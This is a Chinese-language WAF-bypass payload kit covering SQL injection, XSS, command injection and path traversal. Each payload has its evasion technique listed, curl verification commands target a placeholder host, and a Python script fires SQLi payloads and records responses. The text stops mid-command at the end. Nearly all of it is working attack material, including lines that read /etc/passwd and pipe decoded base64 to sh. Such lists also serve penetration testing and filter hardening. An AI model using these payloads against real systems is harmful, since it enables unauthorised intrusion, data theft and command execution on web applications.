## WAF 绕过变形载荷集（SQLi / XSS / 命令注入 / 路径穿越）

> 选型：纯文本载荷清单 + 可复现验证命令，按注入类型分组，每条附变形原理与适用 WAF 特征。

### 一、SQL 注入变形

| 编号 | 载荷 | 变形原理 | 适用场景 |
| --- | --- | --- | --- |
| SQL-01 | `'/*!50000UNION*//*!50000SELECT*/1,2,3-- -` | MySQL 版本注释内联关键字 | 关键字黑名单 |
| SQL-02 | `'%0aUNION%0aSELECT%0a1,2,3%23` | 换行替代空格 | 空格过滤 |
| SQL-03 | `'UnIoN SeLeCt 1,2,3-- -` | 大小写混淆 | 简单正则 |
| SQL-04 | `'UN/**/ION SEL/**/ECT 1,2,3-- -` | 注释分割关键字 | 连续字符串匹配 |
| SQL-05 | `' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -` | 子查询包裹时间盲注 | 布尔/时间检测 |
| SQL-06 | `' OR 1=1%23` / `' OR '1'='1` | 引号闭合变体 | 基础过滤 |
| SQL-07 | `' UNION SELECT 0x61646d696e,2,3-- -` | 十六进制字符串替代引号 | 引号过滤 |
| SQL-08 | `' AND ASCII(SUBSTR((SELECT/**/database()),1,1))>64-- -` | 函数嵌套 + 注释 | 函数名黑名单 |

验证命令：
```bash
# 时间盲注验证（回显延迟即命中）
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://TARGET/item?id=1'%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))a)--%20-"
# 预期：>5.0 秒
```

### 二、XSS 变形

| 编号 | 载荷 | 变形原理 |
| --- | --- | --- |
| XSS-01 | `<svg/onload=alert(1)>` | 无空格标签 + 事件 |
| XSS-02 | `<img src=x onerror=alert(1)>` | 错误事件触发 |
| XSS-03 | `<details open ontoggle=alert(1)>` | 冷门事件属性 |
| XSS-04 | `<a href="javascript:alert(1)">x</a>` | 伪协议 |
| XSS-05 | `<scr<script>ipt>alert(1)</scr</script>ipt>` | 嵌套标签绕过单次替换 |
| XSS-06 | `<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>` | HTML 实体编码 |
| XSS-07 | `<svg><script>alert&#40;1&#41;</script>` | 括号实体编码 |
| XSS-08 | `<iframe srcdoc="<script>alert(1)</script>">` | srcdoc 属性 |

验证：将载荷注入反射点，浏览器打开页面观察弹窗；DOM 型用 `document.write` 断点确认。

### 三、命令注入变形

| 编号 | 载荷 | 变形原理 |
| --- | --- | --- |
| CMD-01 | `;id` / `\|id` / `&&id` / `\|\|id` | 分隔符轮换 |
| CMD-02 | `%0aid` / `%0did` | 换行/回车分隔 |
| CMD-03 | `$(id)` / `` `id` `` | 命令替换 |
| CMD-04 | `i$@d` / `i""d` / `i''d` | 空变量/空引号拼接 |
| CMD-05 | `cat${IFS}/etc/passwd` | IFS 替代空格 |
| CMD-06 | `w\ho\am\i` | 反斜杠转义 |
| CMD-07 | `echo aWQ=|base64 -d\|sh` | 编码后解码执行 |
| CMD-08 | `{cat,/etc/passwd}` | 花括号展开 |

验证：
```bash
curl -s "http://TARGET/ping?host=127.0.0.1;id"
# 预期回显：uid=33(www-data) gid=33(www-data) ...
```

### 四、路径穿越变形

| 编号 | 载荷 | 变形原理 |
| --- | --- | --- |
| PT-01 | `../../etc/passwd` | 基础 |
| PT-02 | `..%2f..%2fetc%2fpasswd` | URL 编码斜杠 |
| PT-03 | `..%252f..%252fetc%252fpasswd` | 双重编码 |
| PT-04 | `....//....//etc/passwd` | 递归替换绕过 |
| PT-05 | `..%c0%af..%c0%afetc/passwd` | 超长 UTF-8 编码 |
| PT-06 | `/etc/passwd%00.png` | 空字节截断（旧版 PHP） |

### 五、通用绕过辅助

```bash
# 1. 分块传输绕过（Content-Length 缺失 + Transfer-Encoding: chunked）
# 2. 参数污染：?id=1&id=1'UNION SELECT...
# 3. 大小写 + 编码混合：%55NION%20%53ELECT
# 4. 注释混淆：UN/**/ION
# 5. 换行注入：%0d%0a 插入头部
```

### 六、批量验证脚本

```python
#!/usr/bin/env python3
# waf_bypass_test.py — 逐条发送载荷并记录状态码/长度/延迟
import requests, time, sys

TARGET = "http://TARGET/item"
PARAM  = "id"
PAYLOADS = [
    "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -",
    "'%0aUNION%0aSELECT%0a1,2,3%23",
    "'UnIoN SeLeCt 1,2,3-- -",
    "'UN/**/ION SEL/**/ECT 1,2,3-- -",
]

for p in PAYLOADS:
    t0 = time.time()
    try:
        r = requests.get(TARGET, params={PARAM: p}, timeout=10)
        dt = time.time() - t0
        print(f"[{r.status_code}] len={len(r.text):5d} t={dt:.2f}s  {p[:50]}")
    except Exception as e:
        print(f"[ERR] {e}  {p[:50]}")
```

运行：
```bash
python3 waf_bypass_test